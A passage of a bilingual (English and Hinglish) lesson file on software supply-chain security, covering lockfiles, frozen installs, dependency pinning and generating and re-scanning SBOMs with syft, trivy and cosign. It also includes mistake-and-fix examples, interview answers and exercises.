There are three degrees of precision. A **range** like \`^4.18.0\` is convenient and picks up patch and minor updates automatically, but on its own it is non-reproducible — you need a lockfile to make a range deterministic. An **exact version** like \`4.18.2\` in the manifest is reproducible by itself and puts you in control of when a version changes. A **hash** — the integrity field in a lockfile, pip's \`--require-hashes\` mode, or a pinned \`@sha256:...\` digest for a container base image — adds tamper-evidence on top of an exact version: the bytes that arrive must match the hash you recorded, or the build fails. The practical best practice combines these: exact versions or ranges in the manifest, a committed lockfile carrying hashes for the whole tree, and automated pull requests from a tool like Renovate or Dependabot (Lesson 6) that propose moving the pins forward so that updates happen deliberately and reviewably on your schedule rather than silently on every build or not at all.

## The SBOM

A Software Bill of Materials is a machine-readable inventory of every component that went into a build: for each one, its name, version, supplier, license, and an identifier — a package URL, or "purl", and often a CPE — that security tooling can use to match the component against vulnerability databases. Two formats dominate. **SPDX**, from the Linux Foundation and standardised as ISO/IEC 5962, originated in license compliance and has the broadest adoption across tooling and legal processes. **CycloneDX**, from OWASP, was designed for security use cases and carries richer vulnerability and exploitability data, including VEX — Vulnerability Exploitability eXchange — statements that let you assert "this CVE is present but not exploitable in our usage". You generate an SBOM as part of each build, attach it to the resulting artifact or cryptographically attest it (Lesson 5), and store it. Tooling includes syft, cdxgen, and increasingly the build systems themselves — \`npm sbom\`, \`go version -m\` on a binary, container build tools that emit an SBOM attestation.

## Why the SBOM pays for itself

The SBOM turns several slow investigations into fast queries. When a CVE is published against a specific version of a widely used library, the question "which of our artifacts contain that exact version, whether directly or pulled in transitively" becomes a database lookup across your stored SBOMs instead of a frantic week of grepping through build logs and dependency trees — this is precisely the scenario that made Log4Shell so painful for organisations that could not quickly answer it. The SBOM also addresses a subtler problem: the artifact you scanned in CI three months ago is not the same risk profile as the same artifact running in production today, because new CVEs are continuously published against versions that were clean when you shipped them, so re-scanning your stored SBOMs on a schedule surfaces newly-vulnerable deployed software. And SBOMs support license and regulatory compliance — US Executive Order 14028 and the EU Cyber Resilience Act both push toward SBOMs as a requirement for software sold to regulated buyers — and diffing two SBOMs shows exactly what a dependency update added, removed, or changed.`,

    contentHi: `## Aapka code zyादातर doosron ka code hai

Ek modern application ka manifest kholو aur aap ek dozen direct dependencies dekh sakते ho. Iska lockfile kholो aur aap sैंkड़ों ya hazaron packages dekhेंge, kyunki har direct dependency ki apni dependencies hain, aur unki apni, recursively — ye aapke dependency graph ka transitive closure hai. Ek typical Node.js service लगभग ek hazaar packages tak resolve hota hai, roughly ek hazaar alag logon dwara likhe गए लगभग ek million lines of code represent karता hai, jो sab aapke process ke andar aapki application ke privileges ke saath run hota hai. Security consequence ye hai ki aapka attack surface poora tree hai, wo kुछ names nahi jo aapne manifest mein type kiye. Ek package mein ek vulnerability chhe levels deep jiske baare mein aapne kabhi nahi suna abhi bhi aapki application mein ek vulnerability hai.

## Lockfile ek security control hai

Bina ek lockfile ke, ek dependency ek range ke roop mein specified — \`"express": "^4.18.0"\` — install time par jo bhi newest matching version hai us moment par resolve hoती hai. Identical commit ke do builds, ek hafta alag run, isliye alag code pull kar sakते hain. Agmar ek maintainer ka account compromise ho jaता hai aur ek malicious patch release publish hoती hai, aapka very next build ise silently pick karता hai. Ek lockfile — \`package-lock.json\`, \`yarn.lock\`, \`poetry.lock\`, \`Cargo.lock\`, \`go.sum\` — resolved tree mein har package ko ek exact version par record karता hai ek cryptographic hash ke saath. Ye do cheezein karता hai: ye build ko reproducible banाता hai, aur ye tampering ko detectable banाता hai. Operational rule lockfile ko version control mein commit karना aur CI mein frozen-install command ke saath build karना hai — \`npm ci\`, \`pip-sync\`, \`--frozen-lockfile\` — ek bare \`npm install\` ke bजाय.

## Pinning ke levels

Precision ki teen degrees hain. Ek **range** jaise \`^4.18.0\` convenient hai aur automatically patch aur minor updates pick karता hai, par apne aap mein non-reproducible hai. Manifest mein ek **exact version** jaise \`4.18.2\` apne aap reproducible hai. Ek **hash** — ek lockfile mein integrity field, pip ka \`--require-hashes\` mode, ya ek container base image ke liye ek pinned \`@sha256:...\` digest — ek exact version ke upar tamper-evidence add karता hai. Practical best practice inhe combine karता hai: manifest mein exact versions ya ranges, ek committed lockfile poore tree ke liye hashes carry karता, aur Renovate ya Dependabot jaise ek tool se automated pull requests.

## SBOM

Ek Software Bill of Materials ek build mein gaye har component ka ek machine-readable inventory hai: har ek ke liye, iska name, version, supplier, license, aur ek identifier — ek package URL, ya "purl" — jo security tooling component ko vulnerability databases se match karने ke liye use kar sakता hai. Do formats dominate karते hain. **SPDX**, Linux Foundation se aur ISO/IEC 5962 ke roop mein standardised, license compliance mein originate hua. **CycloneDX**, OWASP se, security use cases ke liye designed tha aur richer vulnerability data carry karता hai, including VEX statements. Aap ek SBOM har build ke part ke roop mein generate karते ho, ise artifact se attach karते ho ya cryptographically attest karते ho, aur ise store karते ho. Tooling mein syft, cdxgen shaamil hain.

## Kyun SBOM apne liye pay karता hai

SBOM kई slow investigations ko fast queries mein badalता hai. Jab ek CVE ek widely used library ke ek specific version ke against publish hoता hai, sawaal "hamare konse artifacts mein wo exact version hai, chahे directly ya transitively pulled" ek database lookup ban jaता hai aapke stored SBOMs ke across ek frantic hafta grepping ke bजाय — ye precisely wo scenario hai jisne Log4Shell ko itna painful banaya. SBOM ek subtler problem bhi address karता hai: jo artifact aapne CI mein teen mahine pehle scan kiya wahi risk profile nahi hai jo aaj production mein running same artifact ka hai, kyunki naye CVEs continuously un versions ke against publish hote hain jo clean the jab aapne ship kiye. Aur SBOMs license aur regulatory compliance support karते hain — US Executive Order 14028 aur EU Cyber Resilience Act.`,

    examples: [
      {
        title: 'A 1-dependency manifest resolves to a 5-package tree — generate its SBOM with syft',
        titleHi: 'Ek 1-dependency manifest ek 5-package tree tak resolve hota hai — syft se iska SBOM generate karो',
        code: `# VERIFY
mkdir app && cd app

# the manifest: the developer declared exactly ONE dependency
cat > package.json <<'JSON'
{ "name": "web", "version": "1.0.0", "dependencies": { "express": "4.18.2" } }
JSON

# the lockfile: the resolved TRANSITIVE tree - express pulls in more
cat > package-lock.json <<'JSON'
{
  "name": "web", "version": "1.0.0", "lockfileVersion": 3,
  "packages": {
    "": { "name": "web", "version": "1.0.0", "dependencies": { "express": "4.18.2" } },
    "node_modules/express":     { "version": "4.18.2", "dependencies": { "body-parser": "1.20.1", "cookie": "0.5.0" } },
    "node_modules/body-parser": { "version": "1.20.1", "dependencies": { "bytes": "3.1.2" } },
    "node_modules/cookie":      { "version": "0.5.0" },
    "node_modules/bytes":       { "version": "3.1.2" }
  }
}
JSON

echo "--- manifest declares (direct deps): ---"
grep -oE '"express": "[^"]+"' package.json

echo "--- syft: the ACTUAL bill of materials (the whole resolved tree) ---"
syft scan dir:. -o syft-table 2>/dev/null

echo "--- as CycloneDX JSON (what you attach + store + scan) ---"
syft scan dir:. -o cyclonedx-json 2>/dev/null > sbom.json
python3 - <<'PY'
import json
d = json.load(open('sbom.json'))
print('format:', d['bomFormat'], d['specVersion'])
print('components:', len(d['components']))
for c in sorted(d['components'], key=lambda x: x['name']):
    print('  %-14s %-8s %s' % (c['name'], c['version'], c['purl']))
PY`,
        output: `--- manifest declares (direct deps): ---
"express": "4.18.2"
--- syft: the ACTUAL bill of materials (the whole resolved tree) ---
NAME         VERSION  TYPE
body-parser  1.20.1   npm
bytes        3.1.2    npm
cookie       0.5.0    npm
express      4.18.2   npm
web          1.0.0    npm
--- as CycloneDX JSON (what you attach + store + scan) ---
format: CycloneDX 1.6
components: 5
  body-parser    1.20.1   pkg:npm/body-parser@1.20.1
  bytes          3.1.2    pkg:npm/bytes@3.1.2
  cookie         0.5.0    pkg:npm/cookie@0.5.0
  express        4.18.2   pkg:npm/express@4.18.2
  web            1.0.0    pkg:npm/web@1.0.0
`,
        explain: 'The manifest declares one dependency, express at 4.18.2. The lockfile — here a deliberately tiny hand-written one; a real one has hundreds of entries — records the resolved transitive tree, where express itself pulls in body-parser and cookie, and body-parser pulls in bytes. syft reads the lockfile and produces the actual bill of materials: five components, being the project itself plus its four real dependencies, each with a package URL that uniquely identifies the ecosystem, name, and version so that a scanner can match it against a CVE feed. The CycloneDX output is the machine-readable form you attach to the build artifact and store: when a vulnerability is later published against, say, cookie 0.5.0, you query your stored SBOMs for the purl \`pkg:npm/cookie@0.5.0\` and get the exact list of affected builds in seconds. syft works entirely offline — it is reading and parsing manifests and lockfiles, not contacting a registry — so it fits anywhere in the pipeline, including air-gapped builds.',
        explainHi: 'Manifest ek dependency declare karता hai, express 4.18.2 par. Lockfile — yahaan ek deliberately tiny hand-written wala; ek real wale mein sैंkड़ों entries hain — resolved transitive tree record karता hai, jahaan express khud body-parser aur cookie khींchता hai, aur body-parser bytes khींchता hai. syft lockfile padhता hai aur actual bill of materials produce karता hai: paanch components, being project khud plus iski chaar real dependencies, har ek ek package URL ke saath jo ecosystem, name, aur version ko uniquely identify karता hai taaki ek scanner ise ek CVE feed ke against match kar sake. CycloneDX output wo machine-readable form hai jo aap build artifact se attach karते ho aur store karते ho: jab ek vulnerability baad mein publish hoती hai, say, cookie 0.5.0 ke against, aap apne stored SBOMs ko purl ke liye query karते ho aur seconds mein affected builds ki exact list paते ho. syft poori tarah offline kaam karता hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# no lockfile committed, and CI runs a bare install
  # package.json:  "dependencies": { "left-pad": "^1.3.0", "chalk": "^5.0.0", ... }
  # .gitignore:    package-lock.json          # <-- "it just causes merge conflicts"
  # ci.yml:        - run: npm install && npm test && npm run build
  #
  # monday's build:    chalk 5.3.0, resolves clean, ships.
  # thursday's build:  the SAME git commit. but chalk 5.3.1 was published wednesday
  #                    from a hijacked maintainer account with a postinstall script
  #                    that reads ~/.npmrc and .env. it runs on your CI runner,
  #                    with your registry token and cloud creds, on 'npm install'.
  # you did not change a single line. you cannot even reproduce monday's build.`,
        right: `# commit the lockfile; build frozen; updates are deliberate PRs
  # 1. commit package-lock.json (yes, resolve the occasional conflict - it's a
  #    3-way merge of a generated file; 'npm install' regenerates it cleanly).
  # 2. CI uses the FROZEN install:
  ci.yml:
    - run: npm ci            # installs EXACTLY the lock; errors if lock != package.json;
                             # deletes node_modules first -> fully reproducible
    - run: npm test
  # 3. the lock pins every transitive package to an exact version + an integrity
  #    hash - a tampered tarball fails 'npm ci' with EINTEGRITY.
  # 4. version bumps arrive as Renovate/Dependabot PRs (Lesson 6): visible in a
  #    diff, scanned by CI, reviewed, merged on your schedule - not silently at 3am.
  # 5. for defence in depth: 'npm ci --ignore-scripts' where possible, or an
  #    allowlist of packages permitted to run install scripts.`,
        why: 'A range specifier without a committed lockfile means the exact code your build runs is decided by whatever the registry serves at install time, which makes two things true at once: your builds are not reproducible, so you cannot rebuild last week\'s release to debug it, and you have no control over when new upstream code enters your system. The dangerous case is a maintainer account compromise: an attacker publishes a malicious patch version of a package deep in your tree, often with a postinstall script that runs automatically during \`npm install\`, and your next CI build — of completely unchanged source — executes that script on the runner with your registry token, cloud credentials, and signing keys in the environment. The lockfile closes this by pinning every package in the transitive tree to an exact version and an integrity hash, so the same commit always resolves to the same bytes and a tampered download is rejected. The frozen-install command (\`npm ci\`, \`--frozen-lockfile\`, \`--locked\`) enforces that CI installs exactly the locked set and fails loudly if the lockfile and manifest have drifted apart, rather than silently regenerating the lock. Dependency updates then come through as reviewable pull requests on your timeline, and disabling install scripts or allowlisting which packages may run them adds a further layer.',
        whyHi: 'Ek range specifier bina ek committed lockfile ke ka matlab aapka build jo exact code run karता hai wo jo bhi registry install time par serve karता hai usse decide hota hai, jो do cheezein ek saath true banाता hai: aapke builds reproducible nahi hain, aur aapke paas koi control nahi hai ki kab naya upstream code aapke system mein enter karता hai. Dangerous case ek maintainer account compromise hai: ek attacker aapke tree mein deep ek package ka ek malicious patch version publish karता hai, aksar ek postinstall script ke saath jo \`npm install\` ke dauraan automatically run hota hai, aur aapka next CI build — completely unchanged source ka — us script ko runner par execute karता hai aapke registry token aur cloud credentials ke saath environment mein. Lockfile ise close karता hai transitive tree mein har package ko ek exact version aur ek integrity hash par pin karके. Frozen-install command enforce karता hai ki CI exactly locked set install karता hai.',
      },
      {
        wrong: `# "we run trivy in CI, we're covered" - but nothing is stored, nothing re-scanned
  ci.yml:
    - run: trivy fs --exit-code 1 --severity CRITICAL .   # scan, gate, done
  # the scan on 2025-06-01 was clean. the image ships. it runs in prod for a year.
  # 2025-11-14: CVE-2025-XXXXX (CRITICAL, RCE) is published against a library that
  #             has been in that image, unchanged, the whole time.
  # nobody knows. the CI scan already passed months ago and never runs again for
  # this artifact. there's no SBOM stored, so you can't even query "which of our
  # 90 running images have this library" without rebuilding and re-scanning all 90.`,
        right: `# generate + STORE an SBOM per build; re-scan the stored SBOMs continuously
  ci.yml:
    - run: syft scan . -o cyclonedx-json > sbom.cdx.json
    - run: trivy sbom sbom.cdx.json --exit-code 1 --severity CRITICAL,HIGH   # gate the build
    - run: |                       # attach the SBOM to the release / attest it (Lesson 5)
        cosign attest --predicate sbom.cdx.json --type cyclonedx $IMAGE   # or upload as an artifact
  # then, SEPARATELY, on a schedule (nightly):
  nightly.yml:
    - run: |
        for sbom in $(list_sboms_for_running_images); do
          trivy sbom "$sbom" --severity CRITICAL,HIGH --format json
        done | alert_on_new_findings
  # now: a CVE published today against a library you shipped in June is flagged
  # tomorrow, with the exact list of affected running artifacts - from a query,
  # not a fleet-wide rebuild.`,
        why: 'Scanning in CI answers the question "is this build vulnerable to something known today", and gating on that is necessary, but it is a snapshot. The set of known vulnerabilities grows continuously, and the overwhelming majority of new CVEs are disclosed against versions of software that already exist and are already deployed — the code did not change, the world\'s knowledge about it did. An artifact that passed its CI scan cleanly in June can be running a critical remotely-exploitable vulnerability by November without anything on your side changing, and if the only scan ever performed was the one in the pipeline months ago, nobody will know. Storing an SBOM per build and re-scanning those stored SBOMs on a schedule converts this from an undetectable exposure into a next-day alert, because matching a fresh vulnerability feed against a stored component inventory is cheap and can be done for every artifact you have ever shipped. It also means that when a high-profile CVE lands, you answer "which of our running services are affected" with a query against your SBOM store in minutes, rather than rebuilding and rescanning your entire fleet under pressure.',
        whyHi: 'CI mein scanning is sawaal ka jawaab deता hai "kya ye build aaj kisi known cheez ke liye vulnerable hai", aur ispar gating necessary hai, par ye ek snapshot hai. Known vulnerabilities ka set continuously badhता hai, aur naye CVEs ki overwhelming majority software ke un versions ke against disclosed hoती hai jो already exist karते hain aur already deployed hain — code change nahi hua, iske baare mein duniya ka knowledge hua. Ek artifact jो June mein apna CI scan cleanly pass hua November tak ek critical remotely-exploitable vulnerability run kar sakта hai bina aapki side par kुछ change hue. Per build ek SBOM store karना aur un stored SBOMs ko ek schedule par re-scan karना ise ek undetectable exposure se ek next-day alert mein convert karता hai.',
      },
      {
        wrong: `# generating an SBOM but from the WRONG thing, at the WRONG stage
  # option A: SBOM from the source repo BEFORE the build
  - run: syft scan dir:. -o spdx-json > sbom.json      # <-- misses build-time-injected deps,
                                                       #     vendored code, the base image's OS packages
  # option B: SBOM from 'npm ls' output, dev deps included
  - run: npm ls --all --json > sbom.json               # <-- ships an "SBOM" listing eslint,
                                                       #     jest, typescript as if they're in prod
  # option C: SBOM generated, then the image rebuilt a different way for release
  #           -> the SBOM describes an artifact that was never deployed`,
        right: `# SBOM the DEPLOYABLE ARTIFACT, at the point it's finalised, prod deps only
  # build the release image FIRST, then SBOM THAT image (OS packages + app deps):
  - run: docker build -t $IMAGE --target production .
  - run: syft scan $IMAGE -o cyclonedx-json > sbom.cdx.json   # <-- the real thing:
      # includes the base image's OS packages (apt/apk), the app's PROD deps as
      # actually installed, and any binaries copied in. excludes dev/test deps
      # because they're not in the production stage.
  - run: trivy sbom sbom.cdx.json --severity CRITICAL,HIGH
  # attach the SBOM to THIS image by digest, so the SBOM and the artifact are
  # inseparable:  cosign attest --predicate sbom.cdx.json --type cyclonedx $IMAGE@$DIGEST`,
        why: 'An SBOM is only useful if it accurately describes the thing that actually runs in production, and there are several common ways to generate one that describes something else. Scanning the source repository before the build misses anything the build introduces — dependencies installed by build scripts, vendored third-party code pulled in during compilation, and crucially the operating-system packages in the base image, which are a major source of container CVEs. Generating it from a development dependency listing includes test frameworks, linters, and compilers that are not present in the production artifact, inflating the apparent attack surface and producing false vulnerability matches. And generating an SBOM for one build while shipping a differently-produced artifact means the SBOM documents something that was never deployed. The correct approach is to build the actual deployable artifact first — the production-target container image — and then generate the SBOM from that image, so it captures the base image\'s OS packages, the application\'s production dependencies exactly as installed, and any binaries copied in, while naturally excluding development and test dependencies that the production stage does not contain. The SBOM is then bound to that specific image by digest so the two cannot be separated.',
        whyHi: 'Ek SBOM sirf tab useful hai agmar ye accurately us cheez ko describe karता hai jो actually production mein run hoती hai, aur ek aisा generate karने ke kई common tareeke hain jो kुछ aur describe karता hai. Build se pehle source repository scan karना wo kुछ bhi miss karता hai jो build introduce karता hai — build scripts dwara installed dependencies, compilation ke dauraan pulled vendored third-party code, aur crucially base image mein operating-system packages, jो container CVEs ka ek major source hain. Ek development dependency listing se generate karना test frameworks, linters, aur compilers include karता hai jो production artifact mein present nahi hain. Correct approach actual deployable artifact ko pehle build karना hai — production-target container image — aur phir us image se SBOM generate karना, taaki ye base image ke OS packages, application ki production dependencies exactly jaise installed capture karे. SBOM phir us specific image se digest dwara bound hai.',
      },
    ],

    realWorld: [
      {
        en: '**Log4Shell (CVE-2021-44228)** — the day it dropped, the hard question for most companies was not "how do we patch log4j" but "where IS log4j" — it is a transitive dependency of a huge number of Java libraries, often several levels deep. Organisations with an SBOM inventory answered in minutes; those without spent days grepping build artifacts and JAR manifests across every service.',
        hi: '**Log4Shell (CVE-2021-44228)** — jis din ye aaya, zyादातर companies ke liye hard sawaal "hum log4j kaise patch karें" nahi tha balki "log4j KAHAAN hai" — ye ek bahut bade number of Java libraries ki ek transitive dependency hai, aksar kई levels deep. SBOM inventory wali organisations ne minutes mein jawaab diya; unke bina wale ne din grepping mein bitाye.',
      },
      {
        en: '**`event-stream` (2018)** — a popular npm package\'s maintainer handed the project to a volunteer who added a malicious dependency (`flatmap-stream`) in a minor release that targeted a specific Bitcoin wallet app. It ran for ~2 months, pulled in transitively by millions of installs. A committed lockfile + reviewed dependency-update PRs would have surfaced the new sub-dependency in a diff.',
        hi: '**`event-stream` (2018)** — ek popular npm package ke maintainer ne project ek volunteer ko handed kiya jisne ek minor release mein ek malicious dependency (`flatmap-stream`) add ki jо ek specific Bitcoin wallet app ko target karती thi. Ye ~2 mahine chali, millions of installs dwara transitively pulled. Ek committed lockfile + reviewed dependency-update PRs ne naya sub-dependency ek diff mein surface kiya hota.',
      },
      {
        en: '**US Executive Order 14028 + EU CRA** — after SolarWinds, the US government began requiring SBOMs from software vendors selling to federal agencies; the EU Cyber Resilience Act extends comparable obligations to most commercial software sold in the EU from 2027. SBOM generation moved from "security nice-to-have" to "contractual + legal requirement" for a large slice of the industry.',
        hi: '**US Executive Order 14028 + EU CRA** — SolarWinds ke baad, US government ne federal agencies ko bechने wale software vendors se SBOMs require karना shuru kiya; EU Cyber Resilience Act 2027 se EU mein biki zyादातर commercial software par comparable obligations extend karता hai. SBOM generation "security nice-to-have" se "contractual + legal requirement" mein move ho gaya.',
      },
    ],

    interviewQA: [
      {
        q: 'What is the transitive dependency problem, and why is a lockfile a security control rather than just a convenience?',
        qHi: 'Transitive dependency problem kya hai, aur kyun ek lockfile ek security control hai sirf ek convenience nahi?',
        a: 'The transitive dependency problem is that the code you actually ship is dominated by code you did not write and mostly have not reviewed. You declare a handful of direct dependencies in your manifest, but each of those has its own dependencies, and so on recursively — the transitive closure. A typical Node service resolves to around a thousand packages and roughly a million lines of code from about a thousand different authors, all running with your application\'s privileges. Your security exposure is that whole tree: a vulnerability or a malicious release in a package six levels down that you have never heard of is still arbitrary behaviour in your process. A lockfile is a security control because without one, a version range like caret-4.18.0 is resolved at install time to whatever the registry currently serves, so two builds of the same commit can pull different code, and a compromised patch release published upstream lands on your next build silently with no change on your side. The lockfile pins every package in the transitive tree to an exact version and records a cryptographic integrity hash of its contents. That makes builds reproducible — the same commit always produces the same dependency set — and makes tampering detectable, because a downloaded package whose bytes do not match the recorded hash fails the install. You commit it and build with the frozen-install command — npm ci, --frozen-lockfile, --locked — which installs exactly the locked set and errors if the lock and manifest disagree, instead of a bare install that silently updates the lock.',
        aHi: 'Transitive dependency problem ye hai ki jो code aap actually ship karते ho wo us code se dominated hai jо aapne nahi likha aur zyादातर review nahi kiya. Aap manifest mein kुछ direct dependencies declare karते ho, par un mein se har ek ki apni dependencies hain, recursively — transitive closure. Ek typical Node service लगभग ek hazaar packages tak resolve hota hai. Aapka security exposure wo poora tree hai. Ek lockfile ek security control hai kyunki iske bina, ek version range install time par jо bhi registry currently serve karता hai us par resolve hoता hai, to same commit ke do builds alag code pull kar sakते hain, aur ek compromised patch release aapke next build par silently land karता hai. Lockfile transitive tree mein har package ko ek exact version par pin karता hai aur ek cryptographic integrity hash record karता hai. Aap ise commit karते ho aur frozen-install command ke saath build karते ho.',
      },
      {
        q: 'What is an SBOM, what are the two standard formats, and what problems does having one solve?',
        qHi: 'Ek SBOM kya hai, do standard formats kya hain, aur ek hone se konse problems solve hote hain?',
        a: 'A Software Bill of Materials is a machine-readable inventory of every component in a build: for each, the name, version, supplier, license, and an identifier — typically a package URL, or purl — that tooling can use to match the component against vulnerability databases. The two standard formats are SPDX, from the Linux Foundation and standardised as ISO/IEC 5962, which came from license compliance and has the widest tooling and legal adoption; and CycloneDX, from OWASP, which was built for security and carries richer vulnerability and exploitability data including VEX statements that let you assert a CVE is present but not exploitable in your usage. Having an SBOM solves several problems. First, CVE response: when a vulnerability is published against a specific version of a common library, "which of our artifacts contain that version, directly or transitively" becomes a query against your stored SBOMs rather than a multi-day investigation — this is the Log4Shell scenario. Second, drift: the artifact you scanned in CI months ago is not the same risk today because new CVEs are constantly disclosed against unchanged old versions, so re-scanning stored SBOMs on a schedule surfaces newly-vulnerable deployed software. Third, compliance: US Executive Order 14028 and the EU Cyber Resilience Act push SBOMs toward being a legal requirement for software sold to regulated buyers. And fourth, change visibility: diffing two SBOMs shows exactly what a dependency update added, removed, or changed. You generate it per build, from the actual deployable artifact, and store it bound to that artifact by digest.',
        aHi: 'Ek Software Bill of Materials ek build mein har component ka ek machine-readable inventory hai: har ek ke liye, name, version, supplier, license, aur ek identifier — typically ek package URL, ya purl. Do standard formats SPDX hain, Linux Foundation se aur ISO/IEC 5962 ke roop mein standardised, jо license compliance se aaya; aur CycloneDX, OWASP se, jо security ke liye banaya gaya aur richer vulnerability data carry karता hai including VEX statements. Ek SBOM hone se kई problems solve hote hain. Pehle, CVE response: jab ek vulnerability publish hoती hai, "hamare konse artifacts mein wo version hai" ek query ban jaता hai — ye Log4Shell scenario hai. Doosre, drift: jо artifact aapne mahine pehle scan kiya wo aaj same risk nahi hai. Teesre, compliance. Aur chouthe, change visibility. Aap ise per build generate karते ho, actual deployable artifact se.',
      },
      {
        q: 'What are the levels of dependency pinning, and what does the best-practice combination look like?',
        qHi: 'Dependency pinning ke levels kya hain, aur best-practice combination kaisा dikhता hai?',
        a: 'There are three degrees of precision. A range, like caret-4.18.0 meaning any 4.x at or above that version, is convenient because it picks up patch and minor updates automatically, but by itself it is non-reproducible — you need a lockfile to make a range deterministic, otherwise the resolved version depends on when you install. An exact version, like 4.18.2 in the manifest, is reproducible on its own and puts you in control of exactly when a version changes. A hash — the integrity field in a lockfile, pip\'s --require-hashes mode, or a pinned @sha256 digest for a container base image — adds tamper-evidence on top of an exact version: the bytes that arrive must match what you recorded, or the build fails, which defends against a registry compromise or a man-in-the-middle even when the version number is unchanged. The best-practice combination is: exact versions or ranges in the manifest for readability, a committed lockfile that carries integrity hashes for every package in the transitive tree, CI builds using the frozen-install command so the lockfile is enforced rather than regenerated, and automated pull requests from Renovate or Dependabot that propose advancing the pins. That last piece matters because pinning without an update mechanism just means you run known-vulnerable old versions forever; the automation makes updates happen deliberately, visibly in a diff, scanned and reviewed, on your schedule rather than silently on every build or never.',
        aHi: 'Precision ki teen degrees hain. Ek range convenient hai kyunki ye automatically patch aur minor updates pick karता hai, par apne aap mein non-reproducible hai. Ek exact version apne aap reproducible hai aur aapko control mein rakhता hai. Ek hash — ek lockfile mein integrity field, pip ka --require-hashes mode, ya ek container base image ke liye ek pinned @sha256 digest — ek exact version ke upar tamper-evidence add karता hai. Best-practice combination hai: readability ke liye manifest mein exact versions ya ranges, ek committed lockfile jо transitive tree mein har package ke liye integrity hashes carry karता hai, frozen-install command use karके CI builds, aur Renovate ya Dependabot se automated pull requests jо pins advance karने propose karते hain. Wo last piece matter karता hai kyunki ek update mechanism ke bina pinning ka matlab aap known-vulnerable purani versions hamesha ke liye run karते ho.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain the transitive dependency problem with concrete numbers, and why a lockfile is a security control (reproducibility + tamper-evidence).',
        taskHi: 'Ek comment mein, transitive dependency problem samjhाओ, aur kyun ek lockfile ek security control hai.',
        hint: 'THE TRANSITIVE DEPENDENCY PROBLEM: you DECLARE ~3-12 direct deps in the manifest (package.json / requirements.txt / go.mod); each has its OWN deps, which have theirs, recursively → the TRANSITIVE CLOSURE. Concrete: `package.json` says 3, `package-lock.json` has 400+; a typical Node service resolves to ~1,000 packages ≈ ~1M lines of code by ~1,000 different authors you have never met — ALL running IN your process WITH your app\'s privileges. → your ATTACK SURFACE is the WHOLE TREE, not the 3 names you typed. A vuln (or a malicious release) in a package 6 levels deep you have never heard of is still arbitrary behaviour in your service. THE LOCKFILE IS A SECURITY CONTROL (not just a convenience): WITHOUT one, a range (`"express": "^4.18.0"` = `>=4.18.0 <5`) resolves AT INSTALL TIME to whatever the registry serves THEN → two builds of the SAME commit, a week apart, can pull DIFFERENT code; a compromised patch release (hijacked maintainer account → `4.18.9` ships malware, often via a `postinstall` script) lands on your NEXT build SILENTLY, with zero change on your side, and you cannot even reproduce last week\'s build. WITH one (`package-lock.json` / `yarn.lock` / `poetry.lock` / `Cargo.lock` / `go.sum`): every package in the tree is pinned to an EXACT version + a CONTENT/INTEGRITY HASH. Two effects: (1) REPRODUCIBILITY — the same commit always resolves to the same dependency set (rebuild last week\'s release to debug it). (2) TAMPER-EVIDENCE — a downloaded package whose bytes ≠ the recorded hash FAILS the install (`npm ci` → `EINTEGRITY`). THE RULE: commit the lockfile; in CI build with the FROZEN install (`npm ci` / `pip-sync` / `--frozen-lockfile` / `--locked`) — installs EXACTLY the lock, ERRORS if lock ≠ manifest, never silently regenerates it — NEVER a bare `npm install` in CI. Defence in depth: `--ignore-scripts` or an install-script allowlist.',
        hintHi: 'TRANSITIVE DEPENDENCY PROBLEM: aap manifest mein ~3-12 direct deps DECLARE karते ho; har ek ki APNI deps hain, recursively → TRANSITIVE CLOSURE. Concrete: `package.json` 3 kehта hai, `package-lock.json` mein 400+; ek typical Node service ~1,000 packages ≈ ~1M lines by ~1,000 authors jinse aap kabhi nahi mile — SAB aapke process mein aapki app ke privileges ke saath. → ATTACK SURFACE POORA TREE hai. LOCKFILE EK SECURITY CONTROL HAI: iske BINA, ek range install time par jо bhi registry TAB serve karता hai us par resolve hoता hai → same commit ke do builds ALAG code; ek compromised patch release (hijacked account → malware via `postinstall`) aapke NEXT build par SILENTLY. iske SAATH: har package EXACT version + CONTENT HASH par pinned. Do effects: (1) REPRODUCIBILITY. (2) TAMPER-EVIDENCE (`npm ci` → `EINTEGRITY`). RULE: lockfile commit karो; CI mein FROZEN install (`npm ci` / `--frozen-lockfile`) — KABHI bare `npm install` nahi.',
      },
      {
        task: 'In a comment, describe what an SBOM is (contents, purl, the two formats SPDX vs CycloneDX) and the four problems it solves. Note where/when to generate it.',
        taskHi: 'Ek comment mein, ek SBOM kya hai describe karो aur ye jо chaar problems solve karता hai.',
        hint: 'SBOM (Software Bill of Materials) = a MACHINE-READABLE inventory of EVERY component in a build. Per component: name, version, supplier, license, and an IDENTIFIER — a PACKAGE URL ("purl", e.g. `pkg:npm/cookie@0.5.0`) and often a CPE — so tooling can MATCH it against vulnerability databases. TWO STANDARD FORMATS: SPDX — Linux Foundation, standardised as ISO/IEC 5962; originated in LICENSE compliance; widest tooling + legal adoption. CycloneDX — OWASP; built for SECURITY; richer vulnerability + exploitability data, including VEX (Vulnerability Exploitability eXchange) statements — assert "this CVE is PRESENT but NOT exploitable in our usage". FOUR PROBLEMS IT SOLVES: (1) CVE RESPONSE — a vuln drops against `lib@1.2.3`; "which of our N artifacts contain that exact version, directly OR transitively?" becomes a QUERY against your stored SBOMs, not a multi-day grep through build logs and JAR manifests (THE Log4Shell scenario). (2) DRIFT — the artifact you scanned in CI 3 months ago is NOT the same risk today: new CVEs are constantly disclosed against UNCHANGED old versions (the code didn\'t change, the world\'s knowledge did) → re-scan the STORED SBOMs on a schedule (nightly) → a CVE published today against something you shipped in June is flagged TOMORROW. (3) COMPLIANCE — US Executive Order 14028 (post-SolarWinds, for federal vendors) + EU Cyber Resilience Act (most commercial software, from 2027) push SBOMs from "nice-to-have" to legal/contractual requirement. (4) CHANGE VISIBILITY — diff two SBOMs → exactly what a dependency bump added / removed / changed. WHERE/WHEN TO GENERATE IT: from the ACTUAL DEPLOYABLE ARTIFACT (build the production-target image FIRST, then `syft scan $IMAGE`), at the point it is finalised — so it captures the base image\'s OS packages (apt/apk — a major CVE source) + the app\'s PROD deps as actually installed + copied-in binaries, and EXCLUDES dev/test deps. NOT from the source repo pre-build (misses build-injected + OS packages), NOT from `npm ls` with dev deps (inflates the surface, false matches). Then BIND it to that image BY DIGEST (`cosign attest --predicate sbom.cdx.json --type cyclonedx $IMAGE@$DIGEST`) so SBOM and artifact are inseparable. Tools: syft, cdxgen, `npm sbom`, `go version -m`.',
